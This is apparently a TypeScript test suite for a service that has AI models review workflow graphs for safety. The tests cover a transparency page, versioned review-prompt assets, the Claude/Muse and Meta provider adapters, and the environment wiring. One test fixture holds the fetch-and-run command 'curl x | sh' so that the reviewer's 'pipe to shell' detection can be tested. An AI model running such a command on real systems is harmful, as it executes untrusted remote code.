    expect(html).toContain("version=&quot;v2&quot;");
    expect(html).toContain("{{COMMANDS}}");
    expect(html).toContain(`Version ${REVIEW_PROMPT_VERSION}`);
    expect(html).toContain("install slot");
    expect(html).toContain("engine variables");
    // Each verdict with its hash and date.
    const review = parseStoredReview((await kv.get(reviewKey("graph", "acme", "things", "flow"))) as string);
    expect(html).toContain(`<a class="row-name" href="/g/acme/things/flow">flow</a>`);
    expect(html).toContain(`Verdict of ${MODEL} · Looks safe`);
    expect(html).toContain(`hash: ${review?.hash}`);
    expect(html).toContain(`reviewed: ${review?.reviewed_at}`);
    const twin = await (await call("/transparency", kv, "text/markdown")).text();
    expect(twin).toContain("```mermaid");
    expect(twin).toContain("sequenceDiagram");
    expect(twin).toContain("```xml");
    expect(twin).toContain("<review_prompt");
    expect(twin).not.toContain("<svg");
  });

  it("answers 200 with an empty verdict list on a cold KV", async () => {
    resetIndexMemo();
    const response = await call("/transparency", new FakeKV());
    expect(response.status).toBe(200);
    expect(await response.text()).toContain(TRANSPARENCY_NO_VERDICTS);
  });

  it("labels the review participant with the configured provider", async () => {
    const html = await (await call("/transparency", new FakeKV(), undefined, "meta")).text();
    expect(html).toContain("Meta API");
    expect(html).not.toContain("Claude API");
    expect(html).not.toContain("{{REVIEW_PROVIDER}}");
    const twin = await (await call("/transparency", new FakeKV(), "text/markdown", "meta")).text();
    expect(twin).toContain("Meta API");
    expect(twin).not.toContain("{{REVIEW_PROVIDER}}");
  });

  it("names Claude's API for either of its ids", async () => {
    for (const provider of ["claude", "anthropic"]) {
      const html = await (await call("/transparency", new FakeKV(), undefined, provider)).text();
      expect(html, provider).toContain("Claude API");
      expect(html, provider).not.toContain("{{REVIEW_PROVIDER}}");
    }
  });

  it("switches the wide art for the phone timeline at the 639 px breakpoint", async () => {
    const html = await (await call("/transparency", new FakeKV(), undefined, "meta")).text();
    expect(html).toContain(`<figure class="diagram diagram-wide">`);
    expect(html).toContain(`<figure class="diagram diagram-mobile">`);
    // The narrow screen shows the timeline by default and hides the wide art.
    expect(html).toMatch(/@media \(max-width: 639px\) \{[\s\S]*?figure\.diagram-wide \{ display: none; \}/);
    expect(html).toMatch(/figure\.diagram-mobile \{ display: none; \}/);
    // The narrow figure full-bleeds the 1rem page gutter and the timeline
    // fills it, so its 360-unit viewBox renders at 360 px: 11-unit text is
    // 11 px effective.
    expect(html).toMatch(/figure\.diagram-mobile \{[^}]*?display: block;[^}]*?margin: 0 -1rem 1\.5rem;[^}]*?padding: 0;/);
    expect(html).toContain(`figure.diagram-mobile svg { min-width: 0; width: 100%; }`);
    // Both diagrams carry the substituted provider label, never the token.
    const wideAt = html.indexOf(`<figure class="diagram diagram-wide">`);
    const mobileAt = html.indexOf(`<figure class="diagram diagram-mobile">`);
    const wide = html.slice(wideAt, mobileAt);
    const mobile = html.slice(mobileAt, html.indexOf(`</figure>`, mobileAt));
    expect(wide).toContain("Meta API");
    expect(mobile).toContain("Meta API");
    expect(html).not.toContain(REVIEW_PROVIDER_TOKEN);
  });

  it("labels every provider value exactly", () => {
    const cases: Array<[string | undefined, string]> = [
      ["Muse", "Muse API"],
      ["  MUSE  ", "Muse API"],
      ["meta", "Meta API"],
      ["Meta", "Meta API"],
      ["claude", "Claude API"],
      ["Anthropic", "Claude API"],
      ["off", "Review API"],
      ["", "Review API"],
      [undefined, "Review API"],
      ["garbage", "Review API"],
    ];
    for (const [provider, label] of cases) {
      expect(reviewProviderLabel(provider), provider ?? "undefined").toBe(label);
    }
  });

  it("labels a Muse scan in the diagram and its markdown twin", async () => {
    const html = await (await call("/transparency", new FakeKV(), undefined, "Muse")).text();
    expect(html).toContain("Muse API");
    expect(html).not.toContain("Meta API");
    expect(html).not.toContain("Claude API");
    expect(html).not.toContain(REVIEW_PROVIDER_TOKEN);
    const twin = await (await call("/transparency", new FakeKV(), "text/markdown", "Muse")).text();
    expect(twin).toContain("Muse API");
    expect(twin).toContain("participant Review as Muse API");
    expect(twin).not.toContain(REVIEW_PROVIDER_TOKEN);
  });

  it("keeps the diagram with a generic label when scanning is off", async () => {
    for (const provider of [undefined, "off"]) {
      const html = await (await call("/transparency", new FakeKV(), undefined, provider)).text();
      expect(html).toContain("<svg");
      expect(html).toContain("Review API");
      expect(html).not.toContain("Claude API");
      expect(html).not.toContain("{{REVIEW_PROVIDER}}");
    }
  });

  it("is linked from the header nav and the colophon", async () => {
    resetIndexMemo();
    const html = await (await call("/transparency", new FakeKV())).text();
    const header = html.slice(html.indexOf(`<header class="site-header">`), html.indexOf(`</header>`));
    expect(header).toMatch(/<a href="\/transparency" aria-label="Transparency" title="Transparency"><svg[\s\S]*?<\/svg><span>Transparency<\/span><\/a>/);
    const footer = html.slice(html.indexOf(`<footer class="look-colophon">`), html.indexOf(`</footer>`));
    expect(footer).toContain(`<a href="/transparency">Transparency</a>`);
  });
});

describe("the bundled review assets", () => {
  it("versions the prompt in XML with the install-review facts", () => {
    expect(REVIEW_PROMPT_VERSION).toBe("v2");
    expect(REVIEW_PROMPT_V2).toContain(`<review_prompt version="v2">`);
    expect(REVIEW_PROMPT_V2).toContain("{{PATTERNS}}");
    expect(REVIEW_PROMPT_V2).toContain("{{COMMANDS}}");
    expect(REVIEW_PROMPT_V2).toContain("{{PROMPTS}}");
    expect(REVIEW_PROMPT_V2).toContain("{{ATTENTION}}");
    expect(REVIEW_PROMPT_V2).toContain("looks-safe");
    expect(REVIEW_PROMPT_V2).toContain("needs-look");
    expect(REVIEW_PROMPT_V2).toContain("flagged");
    // v2: the install slot and engine variables are ordinary, never
    // needs-look on their own, and reasons name what to check.
    expect(REVIEW_PROMPT_V2).toContain("&lt;GATE-SCRIPT&gt;");
    expect(REVIEW_PROMPT_V2).toContain("install slot");
    expect(REVIEW_PROMPT_V2).toContain("fails closed");
    expect(REVIEW_PROMPT_V2).toContain("{{workdir}}");
    expect(REVIEW_PROMPT_V2).toContain("{{spec_content}}");
    expect(REVIEW_PROMPT_V2).toContain("engine variables");
    expect(REVIEW_PROMPT_V2).toContain("exactly what to check");
    expect(REVIEW_PROMPT_V2).toContain("Read the `Fetch deps` node");
    expect(REVIEW_PROMPT_V2).toContain("never");
  });

  it("pre-renders the sequence diagram to static SVG", () => {
    expect(INDEXING_MMD).toContain("sequenceDiagram");
    expect(INDEXING_MMD).toContain("autonumber");
    expect(INDEXING_MMD).toContain("loop per repository");
    expect(INDEXING_MMD).toContain("activate Worker");
    expect(INDEXING_MMD).toContain("deactivate Worker");
    expect(INDEXING_MMD).toContain("participant Review as {{REVIEW_PROVIDER}}");
    expect(INDEXING_MMD).not.toContain("Claude API");
    for (const participant of ["Cron", "Worker", "GitHub", "KV", "Review", "Browser"]) {
      expect(INDEXING_MMD).toContain(participant);
    }
    for (const message of [
      "scheduled trigger",
      "discover topic",
      "validate graph and node JSON",
      "write index, docs, meta",
      "review newest unscanned docs",
      "write reviews and pattern links",
      "blocked list",
      "repository list",
      "documents",
    ]) {
      expect(INDEXING_MMD).toContain(message);
    }
    expect(INDEXING_SVG).toContain("<svg");
    expect(INDEXING_SVG).toContain(">Cron</text>");
    expect(INDEXING_SVG).toContain("review newest unscanned docs");
    expect(INDEXING_SVG).toContain("{{REVIEW_PROVIDER}}");
    expect(INDEXING_SVG).toContain("loop · per repository");
    expect(INDEXING_SVG).not.toContain("mermaid");
    expect(INDEXING_SVG).not.toContain("Claude API");
  });

  it("ships the phone timeline at 360 units with no text under 11 px", () => {
    expect(INDEXING_MOBILE_SVG).toContain("<svg");
    expect(INDEXING_MOBILE_SVG).toMatch(/viewBox="0 0 360 /);
    expect(INDEXING_MOBILE_SVG).toContain("{{REVIEW_PROVIDER}}");
    expect(INDEXING_MOBILE_SVG).toContain("Index");
    expect(INDEXING_MOBILE_SVG).toContain("Serve");
    // Numberless: the timeline carries no step badges.
    expect(INDEXING_MOBILE_SVG).not.toContain(`class="num"`);
    expect(INDEXING_MOBILE_SVG).toContain(`r="5"`);
    expect(INDEXING_MOBILE_SVG).toContain(`r="3.5"`);
    const sizes = [...INDEXING_MOBILE_SVG.matchAll(/font-size:(\d+(?:\.\d+)?)px/g)].map((match) => Number(match[1]));
    expect(sizes.length).toBeGreaterThan(0);
    expect(Math.min(...sizes)).toBeGreaterThanOrEqual(11);
  });
});

describe("the Muse provider", () => {
  const DOCUMENT: ReviewDocument = {
    kind: "graph",
    owner: "acme",
    repo: "things",
    slug: "flow",
    name: "flow",
    document: graphDoc("flow", "echo hi") as unknown as JsonValue,
  };

  function claudeStub(text: string, status = 200) {
    return fakeFetch([{
      url: "api.anthropic.com/v1/messages",
      status,
      body: { content: [{ type: "text", text }] },
    }]);
  }

  it("fills the prompt with facts and parses the verdict JSON", async () => {
    const fake = claudeStub(JSON.stringify({
      verdict: "looks-safe",
      reasons: "",
      patterns: ["deterministic-gates", "unknown-slug"],
    }));
    const provider = createClaudeProvider({
      apiKey: "secret",
      model: "claude-test",
      patternSlugs: SLUGS,
      fetchImpl: fake.fetchImpl,
    });
    expect(provider.model).toBe("claude-test");
    const result = await provider.review(DOCUMENT);
    expect(result).toEqual({ verdict: "looks-safe", reasons: "", patterns: ["deterministic-gates"] });
    expect(fake.calls).toHaveLength(1);
    const sent = JSON.parse(fake.bodies[0] ?? "{}") as { model: string; messages: Array<{ content: string }> };
    expect(sent.model).toBe("claude-test");
    expect(sent.messages[0]?.content).toContain("echo hi");
    expect(sent.messages[0]?.content).toContain("deterministic-gates");
    expect(sent.messages[0]?.content).not.toContain("secret");
  });

  it("extracts JSON wrapped in prose and answers no patterns for nodes", async () => {
    const fake = claudeStub(`Here it is:\n{"verdict": "flagged", "reasons": "bad", "patterns": ["deterministic-gates"]}\nDone.`);
    const provider = createClaudeProvider({
      apiKey: "secret",
      model: "claude-test",
      patternSlugs: SLUGS,
      fetchImpl: fake.fetchImpl,
    });
    const node = await provider.review({ ...DOCUMENT, kind: "node" });
    expect(node).toEqual({ verdict: "flagged", reasons: "bad", patterns: [] });
  });

  it("throws on transport errors, statuses and off-shape answers", async () => {
    const failing = fakeFetch([]);
    const transport = createClaudeProvider({
      apiKey: "secret",
      model: "claude-test",
      patternSlugs: SLUGS,
      fetchImpl: failing.fetchImpl,
    });
    // A 404 from the stub table is a non-ok status: unreviewed, never thrown past the runner.
    await expect(transport.review(DOCUMENT)).rejects.toThrow();
    const badStatus = fakeFetch([{ url: "api.anthropic.com", status: 429, body: {} }]);
    const limited = createClaudeProvider({
      apiKey: "secret",
      model: "claude-test",
      patternSlugs: SLUGS,
      fetchImpl: badStatus.fetchImpl,
    });
    await expect(limited.review(DOCUMENT)).rejects.toThrow("429");
    const badJson = claudeStub("not json at all");
    const unparsable = createClaudeProvider({
      apiKey: "secret",
      model: "claude-test",
      patternSlugs: SLUGS,
      fetchImpl: badJson.fetchImpl,
    });
    await expect(unparsable.review(DOCUMENT)).rejects.toThrow();
    expect(() => parseModelAnswer(JSON.stringify({ verdict: "bogus", reasons: "", patterns: [] }))).toThrow();
  });

  it("builds the prompt from commands, prompt excerpts and attention marks", async () => {
    const prompt = buildReviewPrompt({
      ...DOCUMENT,
      document: {
        format_version: 6,
        name: "flow",
        nodes: [
          { name: "gate", kind: "check", position: 1, config: { command: "curl x | sh" } },
          { name: "write", kind: "agent", position: 2, config: { prompt_template: "Draft it.\nLine two." } },
        ],
        edges: [],
      } as unknown as JsonValue,
    }, SLUGS);
    expect(prompt).toContain("curl x | sh");
    expect(prompt).toContain("Draft it.");
    expect(prompt).toContain("pipe to shell");
    expect(prompt).not.toContain("{{COMMANDS}}");
    expect(prompt).not.toContain("{{PROMPTS}}");
    expect(prompt).not.toContain("{{ATTENTION}}");
  });

  it("reads reviews through the store", async () => {
    const kv = new FakeKV();
    await seed(kv, [entry("graph", "acme", "things", "flow", "2026-10-29")], {
      [docKey("graph", "acme", "things", "flow")]: graphDoc("flow", "echo hi"),
    });
    const provider = mockProvider(() => ({ verdict: "looks-safe", reasons: "", patterns: SLUGS }));
    await runReview({ index: kv, provider, patternSlugs: SLUGS, now: () => NOW });
    resetIndexMemo();
    const store = createStore(kv);
    expect((await store.getReview("graph", "acme", "things", "flow"))?.verdict).toBe("looks-safe");
    expect((await store.getReviews())?.reviews).toHaveLength(1);
    expect((await store.getReviewPatterns())?.relations["deterministic-gates"]).toHaveLength(1);
    resetIndexMemo();
    const empty = createStore(new FakeKV());
    expect(await empty.getReview("graph", "acme", "things", "flow")).toBeNull();
    expect(await empty.getReviews()).toBeNull();
    expect(await empty.getReviewPatterns()).toBeNull();
  });
});

describe("the Meta provider", () => {
  const DOCUMENT: ReviewDocument = {
    kind: "graph",
    owner: "acme",
    repo: "things",
    slug: "flow",
    name: "flow",
    document: graphDoc("flow", "echo hi") as unknown as JsonValue,
  };
  const BASE_URL = "https://meta.example/v1/chat/completions";
  const API_KEY = "test-meta-key";
  const MODEL = "muse-spark-1.3-contributor";

  interface Captured {
    url: string;
    headers: Record<string, string>;
    body: string;
  }

  interface Canned {
    status: number;
    body?: unknown;
    text?: string;
  }

  /** An inline stub: fakeFetch records URLs and bodies, not headers. */
  function metaStub(answers: Canned[]): { fetchImpl: typeof fetch; calls: Captured[] } {
    const calls: Captured[] = [];
    const fetchImpl = (async (input: URL | Request | string, init?: RequestInit) => {
      const url = input instanceof Request ? input.url : String(input);
      const body = typeof init?.body === "string" ? init.body : "";
      const headers: Record<string, string> = {};
      new Headers(init?.headers).forEach((value, key) => {
        headers[key] = value;
      });
      calls.push({ url, headers, body });
      const next = answers[Math.min(calls.length - 1, answers.length - 1)] as Canned;
      const payload = next.text ?? JSON.stringify(next.body ?? {});
      return new Response(payload, {
        status: next.status,
        headers: { "content-type": "application/json" },
      });
    }) as unknown as typeof fetch;
    return { fetchImpl, calls };
  }

  /** One chat.completion answer carrying this content and usage. */
  function chatBody(content: unknown, usage?: Record<string, unknown>): Record<string, unknown> {
    const body: Record<string, unknown> = { choices: [{ message: { content } }] };
    if (usage !== undefined) {
      body["usage"] = usage;
    }
    return body;
  }

  const USAGE = { prompt_tokens: 11, completion_tokens: 22, total_tokens: 33 };
  const VERDICT = JSON.stringify({ verdict: "looks-safe", reasons: "", patterns: ["deterministic-gates", "unknown-slug"] });

  it("sends the key, the verbatim model and the usage-logged call to the base URL", async () => {
    const stub = metaStub([{ status: 200, body: chatBody(VERDICT, USAGE) }]);
    const lines: string[] = [];
    const provider = createMetaProvider({
      apiKey: API_KEY,
      baseUrl: BASE_URL,
      model: MODEL,
      patternSlugs: SLUGS,
      fetchImpl: stub.fetchImpl,
      log: (line) => {
        lines.push(line);
      },
    });
    expect(provider.model).toBe(MODEL);
    const result = await provider.review(DOCUMENT);
    expect(result).toEqual({ verdict: "looks-safe", reasons: "", patterns: ["deterministic-gates"] });
    expect(stub.calls).toHaveLength(1);
    const sent = stub.calls[0] as Captured;
    expect(sent.url).toBe(BASE_URL);
    expect(sent.headers["authorization"]).toBe(`Bearer ${API_KEY}`);
    const body = JSON.parse(sent.body) as {
      model: string;
      max_tokens: number;
      reasoning_effort: string;
      messages: Array<{ content: string }>;
    };
    expect(body.model).toBe(MODEL);
    expect(body.reasoning_effort).toBe("minimal");
    expect(body.max_tokens).toBe(META_DEFAULT_MAX_TOKENS);
    expect(body.messages[0]?.content).toContain("echo hi");
    expect(body.messages[0]?.content).toContain("deterministic-gates");
    expect(body.messages[0]?.content).not.toContain("<!--");
    expect(sent.body).not.toContain(API_KEY);
    expect(lines).toHaveLength(1);
    expect(lines[0]).toContain("effort=minimal");
    expect(lines[0]).toContain("prompt=11");
    expect(lines[0]).toContain("completion=22");
    expect(lines[0]).toContain("total=33");
    expect(lines[0]).not.toContain(API_KEY);
  });

  it("answers no patterns for nodes, whatever the model named", async () => {
    const stub = metaStub([{
      status: 200,
      body: chatBody(JSON.stringify({ verdict: "flagged", reasons: "bad", patterns: ["deterministic-gates"] }), USAGE),
    }]);
    const provider = createMetaProvider({
      apiKey: API_KEY,
      baseUrl: BASE_URL,
      model: MODEL,
      patternSlugs: SLUGS,
      fetchImpl: stub.fetchImpl,
    });
    const node = await provider.review({ ...DOCUMENT, kind: "node" });
    expect(node).toEqual({ verdict: "flagged", reasons: "bad", patterns: [] });
  });

  it("honors effort overrides and clamps the budget to its floor and ceiling", async () => {
    expect(resolveMetaEffort(undefined)).toBe("minimal");
    expect(resolveMetaEffort("bogus")).toBe("minimal");
    expect(resolveMetaEffort("low")).toBe("low");
    expect(resolveMetaEffort("HIGH")).toBe("high");
    expect(resolveMetaMaxTokens(undefined)).toBe(META_DEFAULT_MAX_TOKENS);
    expect(resolveMetaMaxTokens("nope")).toBe(META_DEFAULT_MAX_TOKENS);
    expect(resolveMetaMaxTokens("1")).toBe(META_MIN_MAX_TOKENS);
    expect(resolveMetaMaxTokens("99999999")).toBe(META_MAX_MAX_TOKENS);
    const stub = metaStub([{ status: 200, body: chatBody(VERDICT, USAGE) }]);
    const provider = createMetaProvider({
      apiKey: API_KEY,
      baseUrl: BASE_URL,
      model: MODEL,
      patternSlugs: SLUGS,
      effort: "low",
      maxTokens: "1",
      fetchImpl: stub.fetchImpl,
    });
    await provider.review(DOCUMENT);
    const body = JSON.parse((stub.calls[0] as Captured).body) as {
      max_tokens: number;
      reasoning_effort: string;
    };
    expect(body.reasoning_effort).toBe("low");
    expect(body.max_tokens).toBe(META_MIN_MAX_TOKENS);
  });

  it("retries once with the repair instruction on unparsable output, then gives up", async () => {
    const lines: string[] = [];
    const stub = metaStub([
      { status: 200, body: chatBody("not json at all", { prompt_tokens: 1, completion_tokens: 2, total_tokens: 3 }) },
      { status: 200, body: chatBody(VERDICT, { prompt_tokens: 4, completion_tokens: 5, total_tokens: 9 }) },
    ]);
    const provider = createMetaProvider({
      apiKey: API_KEY,
      baseUrl: BASE_URL,
      model: MODEL,
      patternSlugs: SLUGS,
      fetchImpl: stub.fetchImpl,
      log: (line) => {
        lines.push(line);
      },
    });
    const result = await provider.review(DOCUMENT);
    expect(result.verdict).toBe("looks-safe");
    expect(stub.calls).toHaveLength(2);
    expect((stub.calls[0] as Captured).body).not.toContain("ONLY the JSON object");
    expect((stub.calls[1] as Captured).body).toContain(META_REPAIR_INSTRUCTION);
    expect(lines).toHaveLength(2);
    expect(lines[0]).toContain("attempt=1");
    expect(lines[1]).toContain("attempt=2");
    // A second failure leaves the document unreviewed: the throw, two calls, no more.
    const failing = metaStub([
      { status: 200, body: chatBody("still not json", USAGE) },
      { status: 200, body: chatBody("never json", USAGE) },
    ]);
    const retry = createMetaProvider({
      apiKey: API_KEY,
      baseUrl: BASE_URL,
      model: MODEL,
      patternSlugs: SLUGS,
      fetchImpl: failing.fetchImpl,
    });
    await expect(retry.review(DOCUMENT)).rejects.toThrow();
    expect(failing.calls).toHaveLength(2);
  });

  it("falls back safely on malformed model output", async () => {
    const malformed: unknown[] = [
      {},
      { choices: [] },
      { choices: [{ message: { content: null } }] },
      { choices: [{ message: {} }] },
      { choices: "nope" },
    ];
    for (const body of malformed) {
      const stub = metaStub([{ status: 200, body }]);
      const provider = createMetaProvider({
        apiKey: API_KEY,
        baseUrl: BASE_URL,
        model: MODEL,
        patternSlugs: SLUGS,
        fetchImpl: stub.fetchImpl,
      });
      await expect(provider.review(DOCUMENT), JSON.stringify(body)).rejects.toThrow();
    }
    const badStatus = metaStub([{ status: 500, body: {} }]);
    const failing = createMetaProvider({
      apiKey: API_KEY,
      baseUrl: BASE_URL,
      model: MODEL,
      patternSlugs: SLUGS,
      fetchImpl: badStatus.fetchImpl,
    });
    await expect(failing.review(DOCUMENT)).rejects.toThrow("500");
    const transport = createMetaProvider({
      apiKey: API_KEY,
      baseUrl: BASE_URL,
      model: MODEL,
      patternSlugs: SLUGS,
      fetchImpl: (() => Promise.reject(new Error("down"))) as unknown as typeof fetch,
    });
    await expect(transport.review(DOCUMENT)).rejects.toThrow();
    // A missing usage still resolves: the scan logs zeros, never throws.
    const lines: string[] = [];
    const noUsage = metaStub([{ status: 200, body: chatBody(VERDICT) }]);
    const provider = createMetaProvider({
      apiKey: API_KEY,
      baseUrl: BASE_URL,
      model: MODEL,
      patternSlugs: SLUGS,
      fetchImpl: noUsage.fetchImpl,
      log: (line) => {
        lines.push(line);
      },
    });
    const result = await provider.review(DOCUMENT);
    expect(result.verdict).toBe("looks-safe");
    expect(lines).toHaveLength(1);
    expect(lines[0]).toContain("prompt=0");
  });
});

describe("prompt hygiene", () => {
  it("strips the template's leading comments and keeps everything else verbatim", () => {
    const stripped = stripLeadingComments(REVIEW_PROMPT_V2);
    expect(stripped.startsWith("<review_prompt")).toBe(true);
    expect(stripped).toContain("{{PATTERNS}}");
    expect(stripped).toContain("{{COMMANDS}}");
    expect(stripped).toContain("{{PROMPTS}}");
    expect(stripped).toContain("{{ATTENTION}}");
    expect(stripped).not.toContain("<!--");
    const plain = "  <review_prompt>{{COMMANDS}}</review_prompt>";
    expect(stripLeadingComments(plain)).toBe(plain);
  });

  it("sends no comment to the wire", () => {
    const prompt = buildReviewPrompt({
      kind: "graph",
      owner: "acme",
      repo: "things",
      slug: "flow",
      name: "flow",
      document: graphDoc("flow", "echo hi") as unknown as JsonValue,
    }, SLUGS);
    expect(prompt).toContain("echo hi");
    expect(prompt).not.toContain("<!--");
  });

  it("shows the transparency page the same stripped bytes the model saw", async () => {
    const kv = new FakeKV();
    const html = await (await call("/transparency", kv)).text();
    const pre = html.slice(html.indexOf(`<pre class="prompt">`), html.indexOf(`</pre>`));
    expect(pre).toContain("&lt;review_prompt");
    expect(pre).toContain("{{COMMANDS}}");
    expect(pre).not.toContain("<!--");
    expect(pre).not.toContain("&lt;!--");
    const twin = await (await call("/transparency", kv, "text/markdown")).text();
    const fenced = twin.slice(twin.indexOf("```xml"));
    expect(fenced).toContain("<review_prompt");
    expect(fenced).not.toContain("<!--");
  });
});

describe("the meta wiring", () => {
  const FULL: Env = {
    REVIEW_PROVIDER: "meta",
    REVIEW_MODEL: "Custom-Model-1.0",
    META_API_KEY: "test-meta-key",
    META_API_BASE_URL: "https://meta.example/v1/chat/completions",
  };

  function wiringFetch(): { fetchImpl: typeof fetch; calls: string[] } {
    const calls: string[] = [];
    const fetchImpl = (async (input: URL | Request | string) => {
      calls.push(input instanceof Request ? input.url : String(input));
      return new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    }) as unknown as typeof fetch;
    return { fetchImpl, calls };
  }

  it("builds the meta provider case-insensitively with the verbatim model", async () => {
    for (const name of ["meta", "Meta", "META"]) {
      const lines: string[] = [];
      const provider = await reviewProviderFromEnv({ ...FULL, REVIEW_PROVIDER: name }, {
        log: (line) => {
          lines.push(line);
        },
      });
      expect(provider, name).not.toBeNull();
      expect(provider?.model, name).toBe("Custom-Model-1.0");
      expect(lines, name).toEqual([]);
    }
  });

  it("builds the Muse provider case-insensitively on the Claude wiring", async () => {
    for (const name of ["Muse", "muse", " MUSE "]) {
      const provider = await reviewProviderFromEnv({
        REVIEW_PROVIDER: name,
        CLAUDE_API_KEY: "test-claude-key",
        REVIEW_MODEL: "muse-spark-1.3-contributor",
      }, {});
      expect(provider, name).not.toBeNull();
      expect(provider?.model, name).toBe("muse-spark-1.3-contributor");
    }
  });

  it("passes effort and budget from the environment into the call", async () => {
    const seen: string[] = [];
    const fetchImpl = (async (_input: URL | Request | string, init?: RequestInit) => {
      seen.push(typeof init?.body === "string" ? init.body : "");
      return new Response(JSON.stringify({
        choices: [{ message: { content: JSON.stringify({ verdict: "looks-safe", reasons: "", patterns: [] }) } }],
        usage: { prompt_tokens: 1, completion_tokens: 2, total_tokens: 3 },
      }), { status: 200, headers: { "content-type": "application/json" } });
    }) as unknown as typeof fetch;
    const provider = await reviewProviderFromEnv({
      ...FULL,
      REVIEW_EFFORT: "low",
      REVIEW_MAX_TOKENS: "1",
    }, { fetchImpl });
    expect(provider).not.toBeNull();
    await provider?.review({
      kind: "graph",
      owner: "acme",
      repo: "things",
      slug: "flow",
      name: "flow",
      document: graphDoc("flow", "echo hi") as unknown as JsonValue,
    });
    const body = JSON.parse(seen[0] ?? "{}") as { max_tokens: number; reasoning_effort: string };
    expect(body.reasoning_effort).toBe("low");
    expect(body.max_tokens).toBe(META_MIN_MAX_TOKENS);
  });

  it("stays off silently for off, empty and absent providers", async () => {
    for (const name of ["off", "OFF", "", undefined]) {
      const lines: string[] = [];
      const wired = wiringFetch();
      const env: Env = name === undefined ? {} : { REVIEW_PROVIDER: name };
      const provider = await reviewProviderFromEnv(env, {
        fetchImpl: wired.fetchImpl,
        log: (line) => {
          lines.push(line);
        },
      });
      expect(provider, String(name)).toBeNull();
      expect(lines, String(name)).toEqual([]);
      expect(wired.calls, String(name)).toEqual([]);
    }
  });

  it("fails closed with one log line on an unknown provider", async () => {
    const lines: string[] = [];
    const wired = wiringFetch();
    const provider = await reviewProviderFromEnv({ REVIEW_PROVIDER: "bogus" }, {
      fetchImpl: wired.fetchImpl,
      log: (line) => {
        lines.push(line);
      },
    });
    expect(provider).toBeNull();
    expect(lines).toHaveLength(1);
    expect(lines[0]).toContain("unknown REVIEW_PROVIDER");
    expect(wired.calls).toEqual([]);
  });

  it("refuses the meta scan without its key, endpoint or model", async () => {
    const cases: Array<[string, Env, string]> = [
      ["key", { ...FULL, META_API_KEY: "" }, "META_API_KEY"],
      ["endpoint", { ...FULL, META_API_BASE_URL: "" }, "META_API_BASE_URL"],
      ["model", { ...FULL, REVIEW_MODEL: "" }, "REVIEW_MODEL"],
    ];
    for (const [name, env, missing] of cases) {
      const lines: string[] = [];
      const wired = wiringFetch();
      const provider = await reviewProviderFromEnv(env, {
        fetchImpl: wired.fetchImpl,
        log: (line) => {
          lines.push(line);
        },
      });
      expect(provider, name).toBeNull();
      expect(lines, name).toHaveLength(1);
      expect(lines[0], name).toContain(missing);
      expect(wired.calls, name).toEqual([]);
    }
  });
});
